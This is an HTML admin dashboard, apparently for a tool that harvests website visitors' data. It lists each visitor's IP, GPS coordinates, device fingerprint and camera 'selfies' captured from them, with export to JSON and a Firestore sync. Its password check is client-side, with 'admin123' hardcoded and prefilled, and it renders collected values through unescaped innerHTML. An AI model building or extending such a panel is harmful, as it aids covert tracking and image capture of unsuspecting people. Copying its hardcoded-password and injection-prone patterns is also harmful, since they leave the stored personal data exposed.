<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visitor Data Viewer</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .password-section { margin-bottom: 20px; padding: 15px; background: #e9ecef; border-radius: 5px; }
        input[type="password"] { padding: 10px; width: 200px; margin-right: 10px; border: 1px solid #ddd; border-radius: 3px; }
        button { padding: 10px 15px; background: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer; }
        button:hover { background: #0056b3; }
        .hidden { display: none; }
        .tab-container { margin: 20px 0; }
        .tab-buttons { display: flex; gap: 10px; margin-bottom: 10px; }
        .tab-button { padding: 10px 20px; background: #6c757d; color: white; border: none; cursor: pointer; border-radius: 3px; }
        .tab-button.active { background: #007bff; }
        .tab-content { display: none; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
        .tab-content.active { display: block; }
        .visitor-card { border: 1px solid #ddd; margin: 10px 0; padding: 15px; border-radius: 5px; }
        .visitor-card h3 { margin-top: 0; color: #333; }
        .device-info { background: #f8f9fa; padding: 10px; margin: 10px 0; border-radius: 3px; }
        .selfie-container { display: flex; gap: 10px; margin: 10px 0; flex-wrap: wrap; }
        .selfie-container img { max-width: 200px; border: 1px solid #ddd; border-radius: 5px; }
        .stats { background: #d4edda; padding: 10px; border-radius: 5px; margin: 10px 0; }
        .sync-status { padding: 10px; margin: 10px 0; border-radius: 5px; }
        .online { background: #d4edda; }
        .offline { background: #f8d7da; }
        pre { background: #f8f9fa; padding: 10px; border-radius: 5px; overflow-x: auto; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üìä Visitor Data Viewer</h1>
        
        <div class="password-section">
            <input type="password" id="password" placeholder="Enter password" value="admin123">
            <button onclick="checkPassword()">View Data</button>
        </div>
        
        <div id="content" class="hidden">
            <div class="tab-container">
                <div class="tab-buttons">
                    <button class="tab-button active" onclick="showTab('local')">üì± Local Data</button>
                    <button class="tab-button" onclick="showTab('online')">‚òÅÔ∏è Online Data</button>
                </div>
                
                <div id="local-tab" class="tab-content active">
                    <div class="stats" id="local-stats"></div>
                    <button onclick="exportLocalData()">üíæ Export Local Data</button>
                    <button onclick="clearLocalData()">üóëÔ∏è Clear Local Data</button>
                    <div id="local-visitors"></div>
                </div>
                
                <div id="online-tab" class="tab-content">
                    <div class="stats" id="online-stats"></div>
                    <button onclick="loadOnlineData()">üîÑ Refresh Online Data</button>
                    <div id="online-visitors"></div>
                </div>
            </div>
        </div>
    </div>

    <script type="module" src="scripts/firebase.js"></script>
    <script src="scripts/main.js"></script>
    
    <script>
        const PASSWORD = "admin123";
        let onlineData = null;

        function checkPassword() {
            const password = document.getElementById('password').value;
            if (password === PASSWORD) {
                document.getElementById('content').classList.remove('hidden');
                document.querySelector('.password-section').classList.add('hidden');
                loadLocalData();
            } else {
                alert('Incorrect password!');
            }
        }

        function showTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.tab-button').forEach(btn => {
                btn.classList.remove('active');
            });
            
            document.getElementById(tabName + '-tab').classList.add('active');
            event.target.classList.add('active');
            
            if (tabName === 'online' && !onlineData) {
                loadOnlineData();
            }
        }

        function loadLocalData() {
            const visitors = DataCollector.getAllLocalData();
            const container = document.getElementById('local-visitors');
            const stats = document.getElementById('local-stats');
            
            stats.innerHTML = `üìä Local Visitors: ${visitors.length}`;
            container.innerHTML = '';
            
            if (visitors.length === 0) {
                container.innerHTML = '<div class="visitor-card"><p>No local visitor data found.</p></div>';
                return;
            }
            
            visitors.forEach(visitor => {
                const data = visitor.data;
                const card = document.createElement('div');
                card.className = 'visitor-card';
                
                card.innerHTML = `
                    <h3>üë§ ${new Date(data.timestamp).toLocaleString()}</h3>
                    <p><strong>üåê IP:</strong> ${data.ip}</p>
                    <p><strong>üìç Coordinates:</strong> ${data.latitude}, ${data.longitude}</p>
                    
                    <div class="device-info">
                        <strong>üíª Device Information:</strong>
                        ${Object.entries(data.device_info || {}).map(([key, value]) => 
                            `<div><strong>${key}:</strong> ${value}</div>`
                        ).join('')}
                    </div>
                    
                    ${data.selfies && data.selfies.length > 0 ? `
                        <strong>üì∏ Selfies (${data.selfies.length}):</strong>
                        <div class="selfie-container">
                            ${data.selfies.map(selfie => 
                                `<img src="${selfie}" alt="Selfie" onclick="viewFullImage('${selfie}')">`
                            ).join('')}
                        </div>
                    ` : '<p>üì∑ No selfies captured</p>'}
                `;
                
                container.appendChild(card);
            });
        }

        async function loadOnlineData() {
            const container = document.getElementById('online-visitors');
            const stats = document.getElementById('online-stats');
            
            stats.innerHTML = 'üîÑ Loading online data...';
            container.innerHTML = 'Loading...';
            
            try {
                const result = await FirestoreStorage.getAllData();
                
                if (result.success) {
                    onlineData = result.visitors;
                    stats.innerHTML = `‚òÅÔ∏è Online Visitors: ${onlineData.length}`;
                    container.innerHTML = '';
                    
                    if (onlineData.length === 0) {
                        container.innerHTML = '<div class="visitor-card"><p>No online visitor data found.</p></div>';
                        return;
                    }
                    
                    onlineData.forEach(visitor => {
                        const data = visitor.data;
                        const card = document.createElement('div');
                        card.className = 'visitor-card';
                        
                        card.innerHTML = `
                            <h3>üë§ ${new Date(data.timestamp).toLocaleString()}</h3>
                            <p><strong>üåê IP:</strong> ${data.ip}</p>
                            <p><strong>üíª Platform:</strong> ${data.device_info.platform}</p>
                            <p><strong>üì± Screen:</strong> ${data.device_info.screenWidth}x${data.device_info.screenHeight}</p>
                            <p><strong>üåç Language:</strong> ${data.device_info.language}</p>
                            <p><strong>üìç Coordinates:</strong> ${data.latitude}, ${data.longitude}</p>
                            
                            <div class="device-info">
                                <strong>Full Device Info:</strong>
                                <pre>${JSON.stringify(data.device_info, null, 2)}</pre>
                            </div>
                        `;
                        
                        container.appendChild(card);
                    });
                } else {
                    stats.innerHTML = '‚ùå Error loading online data';
                    container.innerHTML = `<div class="visitor-card"><p>Error: ${result.error}</p></div>`;
                }
            } catch (error) {
                stats.innerHTML = '‚ùå Connection error';
                container.innerHTML = `<div class="visitor-card"><p>Error: ${error.message}</p></div>`;
            }
        }

        function exportLocalData() {
            const visitors = DataCollector.getAllLocalData();
            const dataStr = JSON.stringify(visitors, null, 2);
            const blob = new Blob([dataStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `visitor_data_${Date.now()}.json`;
            a.click();
            URL.revokeObjectURL(url);
            alert(`Exported ${visitors.length} visitors`);
        }

        function clearLocalData() {
            if (confirm('Are you sure you want to clear ALL local data?')) {
                const visitors = DataCollector.getAllLocalData();
                visitors.forEach(visitor => {
                    localStorage.removeItem(visitor.key);
                });
                alert('Local data cleared!');
                loadLocalData();
            }
        }

        function viewFullImage(src) {
            window.open(src, '_blank');
        }

        document.getElementById('password').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') checkPassword();
        });
    </script>
</body>
</html>
